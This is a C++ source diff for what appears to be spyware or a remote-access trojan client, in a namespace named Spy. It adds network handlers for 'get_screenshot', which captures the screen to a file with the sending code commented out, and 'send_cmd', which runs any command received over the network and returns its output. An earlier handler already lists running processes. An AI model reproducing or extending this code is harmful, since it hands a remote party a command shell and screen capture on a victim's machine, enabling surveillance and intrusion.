@@ -6,6 +6,8 @@
 #include "../Net.hh"
 #include "MsgBox.hh"
 #include "Process.hh"
+#include "ScreenShot.hh"
+#include "Cmd.hh"
 
 using namespace std;
 
@@ -17,6 +19,8 @@ namespace Spy {
       (*proto)["info"].sig_recv.connect(boost::bind(&session_on_spy::do_info, this, _1));
       (*proto)["warning"].sig_recv.connect(boost::bind(&session_on_spy::do_warning, this, _1));
       (*proto)["get_list_proc"].sig_recv.connect(boost::bind(&session_on_spy::do_get_list_proc, this, _1));
+      (*proto)["get_screenshot"].sig_recv.connect(boost::bind(&session_on_spy::do_get_screenshot, this, _1));
+      (*proto)["send_cmd"].sig_recv.connect(boost::bind(&session_on_spy::do_send_cmd, this, _1));
     }
 
     void do_info(string msg) {
@@ -40,6 +44,29 @@ namespace Spy {
       ss << "//end//";
       (*proto)["list_proc"](ss.str());
     }
+    
+    void do_get_screenshot(string data) {
+      stringstream ss;
+      ss << data;
+      double zoom;
+      ss >> zoom;
+      ScreenShot sc;
+      int w, h;
+      sc.save("test.bmp", zoom);
+      //sc.get_stringstream("test.bmp", ss, w, h);
+      ss << " //end//";
+      //(*proto)["screenshot"](ss.str(), w, h);
+    }
+
+    void do_send_cmd(string _cmd) {
+      Cmd cmd;
+      cout << "cmd : " << _cmd << endl;
+      cmd.exec(_cmd.c_str());
+      stringstream ss(cmd.get_res());
+      ss << " //end//";
+      (*proto)["res_cmd"](ss.str());
+    }
+
   };
 };
 
